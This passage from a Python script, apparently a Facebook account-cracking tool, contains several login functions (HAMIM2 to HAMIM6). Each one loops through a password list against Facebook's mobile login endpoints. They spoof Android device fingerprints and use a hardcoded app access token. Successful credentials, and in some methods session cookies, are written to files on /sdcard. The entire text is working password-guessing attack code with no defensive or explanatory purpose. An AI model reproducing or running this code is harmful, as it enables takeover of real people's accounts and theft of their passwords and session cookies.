"350685531728|62f8ce9f74b12f84c123cc23437a4a32",\n"generate_session_cookies": "1",\n"meta_inf_fbmeta": "",\n"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",\n"currently_logged_in_userid": "0",\n"locale": "en_US",\n"client_country_code": "US",\n"method": "auth.login",\n"fb_api_req_friendly_name": "authenticate",\n"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",\n"api_key": "882a8490361da98702bf97a021ddc14d",}\n                        headers={\n                                'User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36',\n'Content-Type': 'application/x-www-form-urlencoded',\n'Host': 'graph.facebook.com',\n'X-FB-Net-HNI': '45204',\n'X-FB-SIM-HNI': '45201',\n'X-FB-Connection-Type': 'MOBILE.LTE',\n'X-Tigon-Is-Retry': 'False',\n'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',\n'x-fb-device-group': '5120',\n'X-FB-Friendly-Name': 'ViewerReactionsMutation',\n'X-FB-Request-Analytics-Tags': 'graphservice',\n'X-FB-HTTP-Engine': 'Liger',\n'X-FB-Client-IP': 'True',\n'X-FB-Server-Cluster': 'True',\n'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',\n'Content-Length': '698'}\n                        url = 'https://b-graph.facebook.com/auth/login'\n                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'\n                        po = requests.post(url,data=data,headers=headers).json()\n                        if 'session_key' in po:\n                                try:\n                                        uid = po['uid']\n                                except:\n                                        uid = ids\n                                if str(uid) in oks:\n                                        break\n                                else:\n                                        print('\\r\\r\\033[1;32m [HAMIM-OK] '+str(uid)+' | '+pas+'\\033[1;97m')\n                                        open('/sdcard/HAMIM-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\\n')\n                                        oks.append(str(uid))\n                                        break\n                        elif 'www.facebook.com' in po['error']['message']:\n                                try:\n                                        uid = po['error']['error_data']['uid']\n                                except:\n                                        uid = ids\n                                if uid in oks:pass\n                                else:\n                                        print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+str(uid)+' | '+pas+'\\033[1;97m')\n                                        open('/sdcard/HAMIM-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\\n')\n                                        cps.append(str(ids))\n                                        break\n                        else:continue\n                loop+=1\n        except Exception as e:\n                pass\n\ndef HAMIM2(ids,passlist):\n	global loop\n	global oks\n	try:\n		for pas in passlist:\n			sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M2] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))\n			application_version_code=str(random.randint(000000000,999999999))\n			__iam_genius = random.choice(android_models)\n			phone_model = __iam_genius.split('|')[0]\n			phone_company = __iam_genius.split('|')[1]\n			dimensions = __iam_genius.split('|')[2]\n			ffb=random.choice(fbks)\n			dvlk = random.choice(usr)\n			#1 method issue es ma ha\n			ua_string = 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/236.0.0.24.108;FBBV/405428495;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.97,width=720,height=1612};FB_FW/1;]'\n			device_family_id = str(uuid.uuid4())\n			adid = str(uuid.uuid4())\n			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))\n			data = {'adid':adid,\n				'format':'json',\n				'device_id':device_family_id,\n				'email':ids,\n				'password':pas,\n				'generate_analytics_claim':'1',\n				'community_id':'','cpl':'true','try_num':'1',\n				'family_device_id':device_family_id,\n				'credentials_type':'device_based_login_password',\n				'generate_session_cookies':'1',\n				'error_detail_type':'button_with_disabled',\n				'source':'device_based_login',\n				'machine_id':machine_id,\n				'login_location_accuracy_m':'1.0',\n				'meta_inf_fbmeta':'',\n				'advertiser_id':adid,\n				'encrypted_msisdn':'',\n				'currently_logged_in_userid':'0',\n				'locale':'en_PK',\n				'client_country_code':'PK',\n				'method':'auth.login',\n				'fb_api_req_friendly_name':'authenticate',\n				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',\n				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}\n			head = {\n				'content-type':'application/x-www-form-urlencoded',\n				'x-fb-sim-hni':str(random.randint(2e4,4e4)),\n				'x-fb-connection-type':'unknown',\n				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',\n				'api_key': '8114af471d039628db5c68cb127af936',\n				'user-agent':'Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36',\n				'x-fb-net-hni':str(random.randint(2e4,4e4)),\n				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),\n				'x-fb-connection-quality':'EXCELLENT',\n				'x-fb-friendly-name':'authenticate',\n				'accept-encoding':'gzip, deflate',\n				'x-fb-http-engine':	'Liger'}\n			url = 'https://b-api.facebook.com/method/auth.login'\n			po = requests.post(url,data=data,headers=head,allow_redirects=False).text\n			q = json.loads(po)\n			if 'session_key' in q:\n				udx = str(q['uid'])\n				print('\\r\\r\\033[1;32m [HAMIM-OK] '+udx+' | '+pas+'\\033[1;97m')\n				open('/sdcard/HAMIM-rnd-OK.txt', 'a').write(udx+'|'+pas+'\\n')\n				oks.append(ids)\n				break\n			elif 'www.facebook.com' in q['error_msg']:\n				print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+ids+' | '+pas+'\\033[1;97m')\n				open('/sdcard/HAMIM-rnd-CP.txt','a').write(ids+'|'+pas+'\\n')\n				cps.append(ids)\n				break\n			else:\n				continue\n		loop+=1\n	except requests.exceptions.ConnectionError:\n		time.sleep(10)\n	except Exception as e:\n		print(e)\n#new method\n                \ndef HAMIM3(ids,passlist):\n        global loop\n        global oks\n        sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M3] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n        try:\n                for pas in passlist:\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'\n                        fbbv = str(random.randint(111111111,999999999))\n                        android_version = device['android_version']\n                        model = device['model']\n                        build = device['build']\n                        fblc = device['fblc']\n                        fbcr = sim_id\n                        fbmf = device['fbmf']\n                        fbbd = device['fbbd']\n                        fbdv = device['fbdv']\n                        fbsv = device['fbsv']\n                        fbca = device['fbca']\n                        fbdm = device['fbdm']\n                        fbfw = '1'\n                        fbrv = '0'\n                        fban = 'FB4A'\n                        fbpn = 'com.facebook.katana'\n                        en = random.choice(['en_US','en_GB'])\n                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])\n                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])\n                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"\n                               \n                        random_seed = random.Random()\n                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))\n                        device_id = str(uuid.uuid4())\n                        secure = str(uuid.uuid4())\n                        family = str(uuid.uuid4())\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        xd =str(''.join(random_seed.choices(string.digits, k=20)))\n                        sim_serials = f'["{xd}"]'\n                        li = ['28','29','210']\n                        li2 = random.choice(li)\n                        j1 = ''.join(random.choice(digits) for _ in range(2))\n                        jazoest = li2+j1\n                        data = {\n                                'adid':adid,\n                                'format':'json',\n                                'device_id':device_id,\n                                'email':ids,\n                                'password':pas,\n                                'generate_analytics_claims':'1',\n                                'credentials_type':'password',\n                                'source':'login',\n                                'error_detail_type':'button_with_disabled',\n                                'enroll_misauth':'false',\n                                'generate_session_cookies':'1',\n                                'generate_machine_id':'1',\n                                'fb_api_req_friendly_name':'authenticate',\n                        }\n                        headers={\n                                'Authorization':f'OAuth {accessToken}',\n                                'X-FB-Friendly-Name':'authenticate',\n                                'X-FB-Connection-Type':'unknown',\n                                'User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36',\n                                'Accept-Encoding':'gzip, deflate',\n                                'Content-Type': 'application/x-www-form-urlencoded',\n                                'X-FB-HTTP-Engine': 'Liger'\n                                }\n                        url = 'https://b-graph.facebook.com/auth/login'\n                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'\n                        po = requests.post(url,data=data,headers=headers).json()\n                        if 'session_key' in po:\n                                try:\n                                        uid = po['uid']\n                                except:\n                                        uid = ids\n                                if str(uid) in oks:\n                                        break\n                                else:\n                                        print('\\r\\r\\033[1;32m [HAMIM-OK] '+str(uid)+' | '+pas+'\\033[1;97m')\n                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])\n                                        print("\\r\\r\\033[1;33m Cookie: "+coki)\n                                        open('/sdcard/HAMIM-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\\n')\n                                        open('/sdcard/HAMIM-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\\n')\n                                        oks.append(str(uid))\n                                        break\n                        elif 'www.facebook.com' in po['error']['message']:\n                                try:\n                                        uid = po['error']['error_data']['uid']\n                                except:\n                                        uid = ids\n                                if uid in oks:pass\n                                else:\n                                        print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+str(uid)+' | '+pas+'\\033[1;97m')\n                                        open('/sdcard/HAMIM-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\\n')\n                                        cps.append(str(ids))\n                                        break\n                        else:continue\n                loop+=1\n        except Exception as e:\n                pass\n#method4\ndef HAMIM4(ids,passlist):\n        global loop\n        global oks\n        sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M4] %s|\\033[1;32mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n        try:\n                for pas in passlist:\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'\n                        fbbv = str(random.randint(111111111,999999999))\n                        android_version = device['android_version']\n                        model = device['model']\n                        build = device['build']\n                        fblc = device['fblc']\n                        fbcr = sim_id\n                        fbmf = device['fbmf']\n                        fbbd = device['fbbd']\n                        fbdv = device['fbdv']\n                        fbsv = device['fbsv']\n                        fbca = device['fbca']\n                        fbdm = device['fbdm']\n                        fbfw = '1'\n                        fbrv = '0'\n                        fban = 'FB4A'\n                        fbpn = 'com.facebook.katana'\n                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3130};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'\n                        random_seed = random.Random()\n                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))\n                        device_id = str(uuid.uuid4())\n                        secure = str(uuid.uuid4())\n                        family = str(uuid.uuid4())\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        xd =str(''.join(random_seed.choices(string.digits, k=20)))\n                        sim_serials = f'["{xd}"]'\n                        li = ['28','29','210']\n                        li2 = random.choice(li)\n                        j1 = ''.join(random.choice(digits) for _ in range(2))\n                        jazoest = li2+j1\n                        data = {\n                                'adid':adid,\n                                'format':'json',\n                                'device_id':device_id,\n                                'email':ids,\n                                'password':pas,\n                                'generate_analytics_claims':'1',\n                                'credentials_type':'password',\n                                'source':'login',\n                                'error_detail_type':'button_with_disabled',\n                                'enroll_misauth':'false',\n                                'generate_session_cookies':'1',\n                                'generate_machine_id':'1',\n                                'fb_api_req_friendly_name':'authenticate',\n                        }\n                        headers={\n                                'Authorization':f'OAuth {accessToken}',\n                                'X-FB-Friendly-Name':'authenticate',\n                                'X-FB-Connection-Type':'unknown',\n                                'User-Agent':ua,\n                                'Accept-Encoding':'gzip, deflate',\n                                'Content-Type': 'application/x-www-form-urlencoded',\n                                'X-FB-HTTP-Engine': 'Liger'\n                                }\n                        url = 'https://b-graph.facebook.com/auth/login'\n                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'\n                        po = requests.post(url,data=data,headers=headers).json()\n                        if 'session_key' in po:\n                                try:\n                                        uid = po['uid']\n                                except:\n                                        uid = ids\n                                if str(uid) in oks:\n                                        break\n                                else:\n                                        print('\\r\\r\\033[1;32m [HAMIM-OK] '+str(uid)+' | '+pas+'\\033[1;97m')\n                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])\n                                        print("Cookie: "+coki)\n                                        #open('/sdcard/HAMIM-COOKIE.txt','a').write(coki+'\\n')\n                                       # open('/sdcard/HAMIM-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\\n')\n                                        oks.append(str(uid))\n                                        break\n                        elif 'www.facebook.com' in po['error']['message']:\n                                try:\n                                        uid = po['error']['error_data']['uid']\n                                except:\n                                        uid = ids\n                                if uid in oks:pass\n                                else:\n                                        print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+str(uid)+' | '+pas+'\\033[1;97m')\n                                        open('/sdcard/HAMIM-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\\n')\n                                        cps.append(str(ids))\n                                        break\n                        else:continue\n                loop+=1\n        except Exception as e:\n                pass\n#method5\ndef HAMIM5(ids,passlist):\n        global loop\n        global oks\n        sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M5] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n        try:\n                for pas in passlist:\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'\n                        fbbv = str(random.randint(111111111,999999999))\n                        android_version = device['android_version']\n                        model = device['model']\n                        build = device['build']\n                        fblc = device['fblc']\n                        fbcr = sim_id\n                        fbmf = device['fbmf']\n                        fbbd = device['fbbd']\n                        fbdv = device['fbdv']\n                        fbsv = device['fbsv']\n                        fbca = device['fbca']\n                        fbdm = device['fbdm']\n                        fbfw = '1'\n                        fbrv = '0'\n                        fban = 'FB4A'\n                        fbpn = 'com.facebook.katana'\n                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2246};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'\n                        random_seed = random.Random()\n                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))\n                        device_id = str(uuid.uuid4())\n                        secure = str(uuid.uuid4())\n                        family = str(uuid.uuid4())\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        xd =str(''.join(random_seed.choices(string.digits, k=20)))\n                        sim_serials = f'["{xd}"]'\n                        li = ['28','29','210']\n                        li2 = random.choice(li)\n                        j1 = ''.join(random.choice(digits) for _ in range(2))\n                        jazoest = li2+j1\n                        data = {\n                                'adid':adid,\n                                'format':'json',\n                                'device_id':device_id,\n                                'email':ids,\n                                'password':pas,\n                                'generate_analytics_claims':'1',\n                                'credentials_type':'password',\n                                'source':'login',\n                                'error_detail_type':'button_with_disabled',\n                                'enroll_misauth':'false',\n                                'generate_session_cookies':'1',\n                                'generate_machine_id':'1',\n                                'fb_api_req_friendly_name':'authenticate',\n                        }\n                        headers={\n                                'Authorization':f'OAuth {accessToken}',\n                                'X-FB-Friendly-Name':'authenticate',\n                                'X-FB-Connection-Type':'unknown',\n                                'User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36',\n                                'Accept-Encoding':'gzip, deflate',\n                                'Content-Type': 'application/x-www-form-urlencoded',\n                                'X-FB-HTTP-Engine': 'Liger'\n                                }\n                        url = 'https://b-graph.facebook.com/auth/login'\n                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'\n                        po = requests.post(url,data=data,headers=headers).json()\n                        if 'session_key' in po:\n                                try:\n                                        uid = po['uid']\n                                except:\n                                        uid = ids\n                                if str(uid) in oks:\n                                        break\n                                else:\n                                        print('\\r\\r\\033[1;32m [HAMIM-OK] '+str(uid)+' | '+pas+'\\033[1;97m')\n                                        open('/sdcard/HAMIM-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\\n')\n                                        oks.append(str(uid))\n                                        break\n                        elif 'www.facebook.com' in po['error']['message']:\n                                try:\n                                        uid = po['error']['error_data']['uid']\n                                except:\n                                        uid = ids\n                                if uid in oks:pass\n                                else:\n                                        print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+str(uid)+' | '+pas+'\\033[1;97m')\n                                        open('/sdcard/HAMIM-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\\n')\n                                        cps.append(str(ids))\n                                        break\n                        else:continue\n                loop+=1\n        except Exception as e:\n                pass\n#method6\ndef HAMIM6(ids,passlist):\n	global loop\n	global oks\n	try:\n		for pas in passlist:\n			sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M6] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n			session = requests.Session()\n			ua = random.choice(ugen)\n			free_fb = session.get('https://mbasic.facebook.com').text\n			log_data = {\n				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),\n			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),\n			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),\n			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),\n			"try_number":"0",\n			"unrecognized_tries":"0",\n			"email":uid,\n			"pass":ps,\n			"login":"Log In"}\n			headers = {'authority': 'mbasic.facebook.com',\n            "method": 'GET',\n            "scheme": 'https',\n			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',\n			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',\n			'cache-control': 'max-age=0',\n			'sec-ch-prefers-color-scheme': 'light',\n			'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',\n			'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',\n			'sec-ch-ua-mobile': '?1',\n			'sec-ch-ua-platform': '"Android"',\n			'sec-ch-ua-platform-version': '"10.0.0"',\n			'sec-fetch-dest': 'document',\n			'sec-fetch-mode': 'navigate',\n			'sec-fetch-site': 'none',\n			'sec-fetch-user': '?1',\n			'upgrade-insecure-requests': '1',\n			'user-agent':ua}\n			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text\n			log_cookies=session.cookies.get_dict().keys()\n			if 'c_user' in log_cookies:\n				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])\n				uid = coki[151:166]\n				if uid in oks:pass\n				else:\n					if 'checkpoint' in str(lo):\n						print('\\r\\r\\033[1;34m [HAMIM-2F] '+uid+' | '+pas)\n					else:\n						print(f'\\r\\x1b[1;32m [HAMIM-OK] '+uid+' | '+pas)\n						open('/sdcard/HAMIM-rnd-OK.txt', 'a').write(uid+'|'+pas+'\\n')\n						oks.append(uid)\n						break\n			elif 'checkpoint' in log_cookies:\n				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])\n				uid=coki[141:156]\n				if uid in cps:pass\n				else:\n					print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+uid+' | '+pas+'\\033[1;97m')\n					open('/sdcard/HAMIM-rnd-CP.txt', 'a').write(uid+'|'+pas+'\\n')\n					cps.append(ids)\n					break\n			else:\n				continue\n		loop+=1\n	except requests.exceptions.ConnectionError:\n		time.sleep(10)\n	except:\n		pass\ntry:\n	menu()\nexcept requests.exceptions.ConnectionError:\n	print('\\n No internet connection ...')\n	exit()\nexcept:exit()\n""")